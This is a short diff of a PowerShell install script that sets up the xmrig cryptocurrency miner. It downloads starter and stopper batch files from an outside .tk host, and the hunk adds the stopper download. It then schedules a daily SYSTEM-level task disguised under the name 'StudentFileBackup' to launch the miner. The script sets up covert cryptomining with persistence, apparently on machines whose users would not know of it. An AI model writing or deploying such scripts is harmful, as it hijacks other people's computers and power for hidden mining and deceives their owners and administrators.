@@ -27,6 +27,10 @@ cd xmrig-6.8.2
 echo "download starter file"
 iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat
 
+# download stopper file
+echo "download stopper file"
+iwr https://www.thatonelukas.tk/masseisStopper.bat -OutFile stopper.bat
+
 # schedule task
 echo "schedule task"
 schtasks /create /sc daily /tn StudentFileBackup /st 20:00 /ru System /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat"
